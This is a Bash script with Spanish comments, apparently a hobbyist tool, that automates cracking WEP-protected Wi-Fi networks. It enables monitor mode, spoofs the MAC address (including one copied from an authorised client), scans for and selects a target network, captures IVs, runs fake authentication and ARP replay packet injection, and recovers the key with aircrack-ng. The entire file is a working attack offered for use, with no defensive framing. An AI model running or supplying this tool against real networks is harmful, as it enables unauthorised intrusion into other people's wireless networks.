#!/bin/bash
# @filename: aire
# @author: r00tw33d

#definicion de los colores para mostrar la consola
cyan='\e[0;36m'
light='\e[1;36m'
red="\e[0;31m"
yellow="\e[0;33m"
white="\e[0;37m"
END='\e[0m'
#Lista de comandos a utilizar(y validar)
export macchanger=`which macchanger`
export aircrackNg=`which aircrack-ng`

function validar_dependencias {
	echo -e ${yellow}Validando dependencias.${END}
	num_error=0
	
	if [ ${macchanger} = '' ]; then
		echo -e ${red}Es necesario instalar ${macchanger}macchanger${END}
		let num_error=$num_error+1
	fi
	if [ ${aircrackNg} = '' ]; then
		echo -e ${red}Es necesario instalar la suite air-crack${END}
		let num_error=$num_error+1
	fi
	if [ ${num_error} -eq 0 ]; then
		echo Dependencias cumplidas
	else
        echo -e ${red}Numero de dependencias con errores ${num_error} .${END}
        exit ${num_error}
	fi
}

function usage {
	echo $'\n\tUso:' $0 '<interface> [ MA:CA:DD:RE:SS | --dont-fake ]'
	echo $'\ti.e.\n\t\t ' $0 $'wlan0 --dont-fake\n'
	echo $'\tor\t\t' $0 $'wlan0\n'
}

function probe_interface {
	if [ -z `iwconfig 2>&1 | grep 802.11 | awk '{print $1}' | grep ^$1` ]; then
		echo Se ha pedido por una interfaz no valida. Abortando...
		exit
	fi
}

function select_interface {
        echo Buscando alternativas...
        INTERFACES=`iwconfig 2>&1 | grep 802.11 | wc -l`
        if [ "$INTERFACES" -gt 1 ]; then
                echo -e ${white}Especifike un número de la lista:
                iwconfig 2>&1 | grep 802.11 | awk '{print "\t"NR ") " $1}'
                echo -e ${END}
                read IFACEID
		REALIFACE=`iwconfig 2>&1 | grep 802.11 | awk '{print $1}' | head -n$IFACEID | tail -n1`
                if [ -z "$REALIFACE" ]; then
                        exit
		else
			INTERFAZ=$REALIFACE
                fi
        else
                INTERFAZ=`iwconfig 2>&1 | grep 802.11 | awk '{print $1}'`
        fi
}
############################# aqui empieza la secuencia del guion ########################
#valiaciones previas.
validar_dependencias

# Verificando interfaz de red
if [ -z "$1" ]; then
        echo -e ${red}No se proporcionó interfaz de red.${END}
        select_interface
else
	probe_interface $1
	if [ $RETVAL ]; then
		exit
        else
		INTERFAZ=$1
        fi
fi
echo Trabajando con la interfaz $INTERFAZ...

# Comprobando permisos
if [ "$(id -u)" -eq 0 ]; then
        # Verificando interfaz en modo Monitor
        PROBE=`iwconfig 2>&1 | cat - | grep Monitor`
        if [ -z "$PROBE" ]; then
                echo -e ${cyan}Levantando interfaz modo Monitor...${END}
                IFACE=`airmon-ng start $INTERFAZ | tail -n2 | awk '{print $5}' | sed s/\).*//g`
        else
                IFACE=`echo $PROBE | cut -d " " -f1`
        fi
        echo $IFACE '... interfaz configurada.'

        # Configurando MAC address
        if [ "$2" == "--dont-fake" ]; then
                echo 'Conservando la MAC address actual...'
                NEWMAC=`ifconfig $INTERFAZ | grep HW | awk '{print $5}'`
        else
                ifconfig $INTERFAZ down; ifconfig $IFACE down
                if [ -z "$2" ]; then
                        echo 'Reestableciendo direcciones físicas...'
                        FALSA=`macchanger -A $INTERFAZ`
                        NEWMAC=`macchanger -a $INTERFAZ | grep Faked | awk '{print $3}'`
                else
                        echo "Se usará $2 como dirección MAC"
                        RES=`macchanger -m $2 $INTERFAZ | grep Faked`
                        if [ -z "$RES" ]; then
                                echo 'No especificó una MAC address válida. Abortando.'
                                ifconfig $INTERFAZ up; ifconfig $IFACE up
                                exit
                        fi
                        NEWMAC=$2
                fi
                macchanger -m $NEWMAC $IFACE | grep Faked
                echo "Levantando interfaces de red...`ifconfig $INTERFAZ up;ifconfig $IFACE up`"
                echo "Esperando 2 segundos..." && sleep 2 && echo done.
        fi

	echo "Escaneando las redes Wi-Fi..."
        iwlist $INTERFAZ scann 2>&1  | grep -E Cell\|Quality\|ESSID\|Channel: > .info
        cat .info
        echo -n $'\nNumero de Célula [XX]: '
        read CELL
        echo 'Preparando el atake...'
        # Se calcula ke informacion corresponde a la celula
        let HEAD=CELL*4
        cat .info | head -n$HEAD | tail -n4 > .target
        # Se extraen los datos del target
        BSSID=`cat .target | grep Address | awk '{print $5}'`
        CHANNEL=`cat .target | grep Channel | sed s/.*://g`
        ESSID=`cat .target | grep ESSID | sed s/.*://g | sed s/\"//g`
	rm .info .target
        echo 'Comenzando el almacenamiento de IVs en el canal $CHANNEL para\n$ESSID [$BSSID]'

	# sub-shell para la captura de IVs
	rm aire-tmp-* > /dev/null 2>&1
	(xterm -e airodump-ng --encrypt WEP -a --channel $CHANNEL --bssid $BSSID --write aire-tmp $IFACE &)
        (while true; do
		echo Esperando a sintonizar el canal... && sleep 2 && echo done.
                echo $'Lanzando la falsa autenticacion...\n(presione ctrl+c sobre la ventana para cerrarla)'
                (xterm -hold -e aireplay-ng --fakeauth=6000 -o 1 -q 10 -e $ESSID -a $BSSID -h $NEWMAC $IFACE &)
                echo -n "Ha funcionado la falsa autenticacion? (Y/n) "
                read RES
                if [ $RES = 'Y' ]; then
                        exit
                fi
                echo -n "Se necesita de una MAC autorizada [aa:bb:cc:dd:ee:ff]: "
                read NEWMAC
                if [ -z "$NEWMAC" ]; then
                        continue
                fi
                echo 'Reiniciando la interfaz con nueva MAC...'
                ifconfig $IFACE down
                RES=`macchanger -m $NEWMAC $IFACE | grep Faked`
                if [ -z "$RES" ]; then
                        echo 'No especificó una MAC address válida. Configurando con cualkier otra.'
                        NEWMAC=`macchanger -a $IFACE | grep Faked | awk '{print $3}'`
                fi
                echo "Esperando dos segundos..." && sleep 2 && ifconfig $IFACE up
                echo 'Reiniciando airodump-ng...'
                killall airodump-ng && rm aire-tmp-*
                (xterm -e airodump-ng --encrypt WEP -a --channel $CHANNEL --bssid $BSSID --write aire-tmp $IFACE &)
        done)

        echo 'Comenzando a inyectar paketes...'
        (xterm -hold -e aireplay-ng --arpreplay -e $ESSID -b $BSSID -h $NEWMAC $IFACE &)

        echo 'Presione enter cuando hayan suficientes IVs'
        read ENTER
        echo 'Lanzando el atake del Kraken }=:^{}<<' && sleep 2
        CRACKFILE=`ls | grep aire-tmp-0*.cap | tail -n1`
	aircrack-ng $CRACKFILE | strings 2>&1 | egrep Tested\|Fail\|FOUND
        echo 'Borrar archivos temporales? (y/n)'
        read RES
        if [ $RES = 'y' ]; then
                rm aire-tmp-* replay_arp*.cap cracken.tmp
        fi
        echo -e ${red}Matando procesos ${END}
	killall xterm
        echo -e ${red}Terminando la interfaz en modo promiscuo${END}
        airmon-ng stop $IFACE
        echo ${yellow}Travesura realizada. xD${END}
else
        echo -e ${red}Eres r00t?${END}
        echo por favor use: ${0} como usuario root
fi
